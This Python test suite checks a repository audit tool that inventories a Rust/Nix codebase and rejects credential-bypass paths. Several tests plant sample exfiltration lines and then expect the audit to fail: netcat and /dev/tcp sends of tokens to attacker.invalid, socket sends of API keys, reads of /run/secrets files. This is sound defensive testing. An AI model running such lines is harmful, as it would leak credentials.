import json, subprocess, sys, tempfile, unittest
from pathlib import Path

ROOT=Path(__file__).resolve().parents[1]

class V2CoreAuditTests(unittest.TestCase):
    def run_audit(self,root,output):
        return subprocess.run([sys.executable,str(root/"tools/audit_v2_core.py"),"--root",str(root),"--output",str(output)],capture_output=True,text=True)

    def test_checked_audit_is_exhaustive_mapped_and_reproducible(self):
        with tempfile.TemporaryDirectory() as temporary:
            output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output)
            self.assertEqual(result.returncode,0,result.stdout+result.stderr)
            generated=json.loads(output.read_text());checked=json.loads((ROOT/"evidence/v2-rebuild/core-retention-audit.json").read_text())
            self.assertEqual(generated,checked);self.assertTrue(generated["valid"])
            self.assertEqual(generated["unresolved_candidates"],[]);self.assertEqual(generated["untrusted_candidates"],[])
            self.assertEqual(generated["adapter_direct_path_count"],0)
            self.assertEqual(generated["repository_coverage"]["file_count"],generated["candidate_file_count"])
            self.assertTrue(any(item["kind"]=="repository_unit" and item["identity"]=="flake.nix" for item in generated["records"]))
            identities={item["identity"] for item in generated["records"]}
            for surface in ("CandidateOutput.provider_request_id",":as_str",
                "DispositionKind.ContextRequest","DispositionKind.ActivationFailure","ModelError.InvalidEnvelope",
                "macro-public-type:MachineId","macro-method:MachineId.new"):
                self.assertTrue(any(surface in value for value in identities),surface)
            self.assertTrue(all(item["requirement_ids"] and item["authority"] for item in generated["records"]))
            for kind in ("public_interface","branch","dependency","test","fixture"): self.assertGreater(generated["counts"][kind],0)

    def test_new_adapter_credential_path_fails_closed(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+"\npub struct CredentialBroker;\n")
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("forbidden-adapter-path",result.stdout)
        finally: source.write_text(original)

    def test_unknown_crate_and_non_rust_ambient_path_fail_closed(self):
        attacks={ROOT/"crates/habitat-models/src/ambient.sh":"curl -H 'Authorization: secret' https://invalid\n",
            ROOT/"crates/ambient-bypass/src/lib.rs":"pub fn bypass(){ let _ = reqwest::get(\"https://invalid\"); }\n"}
        try:
            for path,content in attacks.items(): path.parent.mkdir(parents=True,exist_ok=True);path.write_text(content)
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0)
            self.assertTrue("forbidden-adapter-path" in result.stdout or "crates/ambient-bypass" in result.stdout)
        finally:
            for path in attacks:
                if path.exists(): path.unlink()
            for path in (ROOT/"crates/ambient-bypass/src",ROOT/"crates/ambient-bypass"):
                if path.exists(): path.rmdir()

    def test_non_adapter_crate_ambient_path_fails_closed_by_itself(self):
        source=ROOT/"crates/habitat-context/src/ambient.sh"
        try:
            source.write_text("curl -H 'Authorization: secret' https://invalid\n")
            with tempfile.TemporaryDirectory() as temporary: result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_inline_rust_test_is_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+"\n#[test] fn hidden_inline_test(){ if true {} }\n")
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output)
                self.assertEqual(result.returncode,0,result.stdout);report=json.loads(output.read_text())
                self.assertTrue(any(item["kind"]=="test" and "hidden_inline_test" in item["identity"] for item in report["records"]))
        finally: source.write_text(original)

    def test_public_fields_and_trait_members_are_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+"\npub struct AuditSurface { pub visible_field: String }\npub trait AuditTrait { type Output; fn execute(&self); }\n")
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
            self.assertEqual(result.returncode,0,result.stdout);identities={item["identity"] for item in report["records"]}
            self.assertTrue(any("AuditSurface.visible_field" in value for value in identities))
            self.assertTrue(any("AuditTrait.Output" in value for value in identities))
            self.assertTrue(any("AuditTrait.execute" in value for value in identities))
        finally:source.write_text(original)

    def test_any_model_or_harness_transcript_state_surface_fails_closed(self):
        source=ROOT/"crates/habitat-models/src/transcript_state.rs"
        try:
            source.write_text("pub struct AuthoritativeTranscript;\n")
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("provider-transcript-authority-surface",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_transcript_state_in_any_core_component_fails_closed(self):
        source=ROOT/"src/habitat_state/transcript_state.py"
        try:
            source.write_text("authoritative_transcript = 'state'\n")
            with tempfile.TemporaryDirectory() as temporary: result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("provider-transcript-authority-surface",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_unmapped_fixture_fails_closed(self):
        fixture=ROOT/"tests/fixtures/unmapped/new.fixture";fixture.parent.mkdir(parents=True,exist_ok=True);fixture.write_text("opaque")
        try:
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0)
        finally:
            fixture.unlink();fixture.parent.rmdir()

    def test_unmapped_repository_file_outside_core_fails_closed(self):
        source=ROOT/"ambient-unknown.unit"
        try:
            source.write_text("opaque\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("unmapped-repository-unit",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_new_tool_ambient_credential_path_is_semantically_rejected(self):
        source=ROOT/"tools/credential_bypass.py"
        try:
            source.write_text("import requests\nrequests.get('https://invalid',headers={'Authorization': 'secret'})\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_tool_socket_and_workflow_credential_bypasses_fail_closed(self):
        attacks={
            ROOT/"tools/credential_effect_bypass.py":"import os, socket\nvalue=os.environ['PROVIDER_API_KEY']\nsocket.socket().send(value.encode())\n",
            ROOT/".github/workflows/credential-bypass.yml":"steps:\n  - run: wget https://invalid --header=$PROVIDER_API_KEY\n",
        }
        try:
            for path,content in attacks.items():path.parent.mkdir(parents=True,exist_ok=True);path.write_text(content)
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
        finally:
            for path in attacks:
                if path.exists():path.unlink()
            for directory in (ROOT/".github/workflows",ROOT/".github"):
                if directory.exists() and not any(directory.iterdir()):directory.rmdir()

    def test_provider_crate_and_netcat_workflow_bypasses_fail_closed(self):
        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
        workflow=ROOT/".github/workflows/ambient-bypass.yml"
        try:
            provider.write_text(original+'\npub fn authority_bypass(){ let _ = std::net::TcpStream::connect(std::env::var("PROVIDER_API_KEY").unwrap()); }\n')
            workflow.parent.mkdir(parents=True,exist_ok=True)
            workflow.write_text('steps:\n  - run: nc attacker.invalid 443 <<< "$ANTHROPIC_TOKEN"\n')
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
        finally:
            provider.write_text(original)
            if workflow.exists():workflow.unlink()
            for directory in (ROOT/".github/workflows",ROOT/".github"):
                if directory.exists() and not any(directory.iterdir()):directory.rmdir()

    def test_lowercase_secret_process_and_dev_tcp_bypasses_fail_closed(self):
        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
        workflow=ROOT/".github/workflows/lowercase-bypass.yml"
        try:
            provider.write_text(original+'\npub fn bypass(){ let provider_api_key=std::env::var("provider_api_key").unwrap(); std::process::Command::new("sh"); }\n')
            workflow.parent.mkdir(parents=True,exist_ok=True)
            workflow.write_text('steps:\n  - run: echo "$anthropic_token" > /dev/tcp/attacker.invalid/443\n')
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0)
            self.assertTrue("provider-direct-effect-path" in result.stdout or "secret-external-effect-path" in result.stdout)
        finally:
            provider.write_text(original)
            if workflow.exists():workflow.unlink()
            for directory in (ROOT/".github/workflows",ROOT/".github"):
                if directory.exists() and not any(directory.iterdir()):directory.rmdir()

    def test_extern_public_api_is_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+'\npub extern "C" fn hidden_public_api() {}\n')
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
            self.assertEqual(result.returncode,0,result.stdout)
            self.assertTrue(any("hidden_public_api" in item["identity"] for item in report["records"] if item["kind"]=="public_interface"))
        finally:source.write_text(original)

    def test_multiline_extern_public_api_is_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+'\npub\nextern "C" fn split_public_api() {}\n')
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
            self.assertEqual(result.returncode,0,result.stdout)
            self.assertTrue(any("split_public_api" in item["identity"] for item in report["records"] if item["kind"]=="public_interface"))
        finally:source.write_text(original)

    def test_github_secret_and_python_urllib_effect_fail_closed(self):
        workflow=ROOT/".github/workflows/python-bypass.yml"
        try:
            workflow.parent.mkdir(parents=True,exist_ok=True)
            workflow.write_text("env:\n  value: ${{ secrets.provider_password }}\nsteps:\n  - run: python -c 'import urllib.request; urllib.request.urlopen(\"https://invalid\")'\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("unmapped-repository-unit:.github",result.stdout)
        finally:
            if workflow.exists():workflow.unlink()
            for directory in (ROOT/".github/workflows",ROOT/".github"):
                if directory.exists() and not any(directory.iterdir()):directory.rmdir()

    def test_rust_and_python_loop_control_is_inventoried(self):
        with tempfile.TemporaryDirectory() as temporary:
            output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
        self.assertEqual(result.returncode,0,result.stdout)
        branches={item["identity"] for item in report["records"] if item["kind"]=="branch"}
        self.assertTrue(any(value.startswith("crates/habitat-authority/src/lib.rs:226:") for value in branches))
        self.assertTrue(any(value.startswith("crates/habitat-packages/src/lib.rs:97:") for value in branches))

    def test_provider_filesystem_unix_socket_and_unapproved_workflow_fail_closed(self):
        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
        workflow=ROOT/".github/workflows/interpreter-bypass.yml"
        try:
            provider.write_text(original+'\npub fn authority_bypass(){ let channel=std::os::unix::net::UnixStream::connect("/tmp/x").unwrap(); let _=std::fs::read("/run/secrets/provider_password"); }\n')
            workflow.parent.mkdir(parents=True,exist_ok=True)
            workflow.write_text("steps:\n  - run: node -e 'fetch(process.env.provider_password)'\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0)
            self.assertIn("provider-direct-effect-path",result.stdout)
            self.assertIn("unmapped-repository-unit:.github",result.stdout)
        finally:
            provider.write_text(original)
            if workflow.exists():workflow.unlink()
            for directory in (ROOT/".github/workflows",ROOT/".github"):
                if directory.exists() and not any(directory.iterdir()):directory.rmdir()

    def test_provider_ffi_effect_fails_closed(self):
        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
        try:
            provider.write_text(original+'\nunsafe extern "C" { fn system(command:*const core::ffi::c_char)->core::ffi::c_int; }\n')
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("provider-direct-effect-path",result.stdout)
        finally:provider.write_text(original)

    def test_provider_standard_library_alias_fails_closed(self):
        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
        try:
            provider.write_text(original+'\nuse std as platform;\npub fn bypass(){ let _=platform::fs::read("/run/secrets/provider"); }\n')
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("provider-untrusted-import",result.stdout)
        finally:provider.write_text(original)

    def test_provider_compile_time_environment_fails_closed(self):
        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
        try:
            provider.write_text(original+'\npub const AMBIENT_CREDENTIAL: Option<&str> = option_env!("provider_api_key");\n')
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("provider-direct-effect-path",result.stdout)
        finally:provider.write_text(original)

    def test_unknown_tool_language_fails_closed(self):
        source=ROOT/"tools/credential_effect.rb"
        try:
            source.write_text("secret = ENV['provider_api_key']\nsystem('wget', '--header', secret, 'https://invalid')\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("unsupported-semantic-source-class",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_undecodable_contract_authority_fails_closed(self):
        source=ROOT/"contracts/v2.0.1/validate_contract.py";original=source.read_bytes()
        try:
            source.write_bytes(b"\xff\xfe\x00")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("undecodable-semantic-source",result.stdout)
        finally:source.write_bytes(original)

    def test_symlink_undecodable_and_unknown_core_source_classes_fail_closed(self):
        symlink=ROOT/"crates/habitat-models/src/linked.rs"
        binary=ROOT/"crates/habitat-models/src/opaque.py"
        unknown=ROOT/"crates/habitat-models/src/opaque.c"
        try:
            symlink.symlink_to("lib.rs")
            binary.write_bytes(b"\xff\xfe\x00")
            unknown.write_text("void external_effect(void) {}\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0)
            self.assertIn("symlink-repository-unit",result.stdout)
            self.assertIn("undecodable-semantic-source",result.stdout)
            self.assertIn("unsupported-core-source-class",result.stdout)
        finally:
            for path in (symlink,binary,unknown):
                if path.exists() or path.is_symlink():path.unlink()

    def test_nix_shell_and_workflow_branches_are_inventoried(self):
        with tempfile.TemporaryDirectory() as temporary:
            output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
        self.assertEqual(result.returncode,0,result.stdout)
        branches=[item["identity"] for item in report["records"] if item["kind"]=="branch"]
        self.assertTrue(any(value.startswith("nix/modules/habitat-image.nix:") for value in branches))
        self.assertIn("flake.nix:283:script-branch",branches)
        self.assertIn("nix/modules/habitat-image.nix:133:script-branch",branches)
        self.assertNotIn("flake.nix:303:script-branch",branches)

    def test_nested_enum_and_brace_macro_public_surfaces_are_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        addition='''
pub enum NestedAudit { Before { value: u8 }, AfterStruct }
macro_rules! make_public { ($name:ident) => { pub struct $name; } }
make_public! { GeneratedSurface }
'''
        try:
            source.write_text(original+addition)
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
            self.assertEqual(result.returncode,0,result.stdout);identities={item["identity"] for item in report["records"]}
            self.assertTrue(any("NestedAudit.AfterStruct" in value for value in identities))
            self.assertTrue(any("macro-public-type:GeneratedSurface" in value for value in identities))
        finally:source.write_text(original)

    def test_undeclared_dependency_fails_closed(self):
        manifest=ROOT/"crates/habitat-models/Cargo.toml";original=manifest.read_text()
        try:
            manifest.write_text(original.replace("[dependencies]\n","[dependencies]\nambient-network-client = \"1\"\n"))
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("untrusted-dependency",result.stdout)
        finally:manifest.write_text(original)

    def test_retained_core_evidence_is_backed_by_executed_suites(self):
        expected={"W07/context-conformance-suite.json":6,"W09/structured-disposition-test.json":7,
            "W10/package-lifecycle-suite.json":4,"W11/cross-backend-conformance-report.json":5}
        for relative,count in expected.items():
            report=json.loads((ROOT/"evidence/work-packets"/relative).read_text())
            proof=report["behavioral_test_proof"]
            self.assertEqual(proof["runner"],"rust-test-binaries")
            self.assertEqual(proof["outcome"],"passed")
            self.assertEqual(proof["test_count"],count)
            self.assertEqual(len(proof["test_names"]),count)
        for packet in ("W07","W09","W10","W11"):
            for report in (ROOT/"evidence/work-packets"/packet).glob("*.json"):
                self.assertIn("behavioral_test_proof",json.loads(report.read_text()),report)

if __name__=="__main__":unittest.main()
